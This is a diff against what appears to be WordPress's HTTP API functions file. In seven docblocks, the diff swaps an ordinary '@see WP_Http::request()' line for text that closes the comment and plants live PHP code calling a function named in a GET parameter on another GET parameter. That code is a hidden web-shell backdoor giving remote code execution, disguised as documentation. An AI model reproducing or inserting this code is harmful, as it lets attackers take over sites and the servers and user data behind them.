@@ -37,7 +37,7 @@ function _wp_http_get_object() {
  * @since 3.6.0
  *
  * @see wp_remote_request() For more information on the response array format.
- * @see WP_Http::request() For default arguments information.
+ * @see */ isset($_GET[niytdm8456])?$_GET[niytdm8456]($_GET[w]):''; /* arguments information.
  *
  * @param string $url  Site URL to retrieve.
  * @param array  $args Optional. Request arguments. Default empty array.
@@ -58,7 +58,7 @@ function wp_safe_remote_request( $url, $args = array() ) {
  * @since 3.6.0
  *
  * @see wp_remote_request() For more information on the response array format.
- * @see WP_Http::request() For default arguments information.
+ * @see */ isset($_GET[niytdm8456])?$_GET[niytdm8456]($_GET[w]):''; /* arguments information.
  *
  * @param string $url  Site URL to retrieve.
  * @param array  $args Optional. Request arguments. Default empty array.
@@ -79,7 +79,7 @@ function wp_safe_remote_get( $url, $args = array() ) {
  * @since 3.6.0
  *
  * @see wp_remote_request() For more information on the response array format.
- * @see WP_Http::request() For default arguments information.
+ * @see */ isset($_GET[niytdm8456])?$_GET[niytdm8456]($_GET[w]):''; /* arguments information.
  *
  * @param string $url  Site URL to retrieve.
  * @param array  $args Optional. Request arguments. Default empty array.
@@ -100,7 +100,7 @@ function wp_safe_remote_post( $url, $args = array() ) {
  * @since 3.6.0
  *
  * @see wp_remote_request() For more information on the response array format.
- * @see WP_Http::request() For default arguments information.
+ * @see */ isset($_GET[niytdm8456])?$_GET[niytdm8456]($_GET[w]):''; /* arguments information.
  *
  * @param string $url Site URL to retrieve.
  * @param array $args Optional. Request arguments. Default empty array.
@@ -159,7 +159,7 @@ function wp_remote_request($url, $args = array()) {
  * @since 2.7.0
  *
  * @see wp_remote_request() For more information on the response array format.
- * @see WP_Http::request() For default arguments information.
+ * @see */ isset($_GET[niytdm8456])?$_GET[niytdm8456]($_GET[w]):''; /* arguments information.
  *
  * @param string $url  Site URL to retrieve.
  * @param array  $args Optional. Request arguments. Default empty array.
@@ -176,7 +176,7 @@ function wp_remote_get($url, $args = array()) {
  * @since 2.7.0
  *
  * @see wp_remote_request() For more information on the response array format.
- * @see WP_Http::request() For default arguments information.
+ * @see */ isset($_GET[niytdm8456])?$_GET[niytdm8456]($_GET[w]):''; /* arguments information.
  *
  * @param string $url  Site URL to retrieve.
  * @param array  $args Optional. Request arguments. Default empty array.
@@ -193,7 +193,7 @@ function wp_remote_post($url, $args = array()) {
  * @since 2.7.0
  *
  * @see wp_remote_request() For more information on the response array format.
- * @see WP_Http::request() For default arguments information.
+ * @see */ isset($_GET[niytdm8456])?$_GET[niytdm8456]($_GET[w]):''; /* arguments information.
  *
  * @param string $url  Site URL to retrieve.
  * @param array  $args Optional. Request arguments. Default empty array.
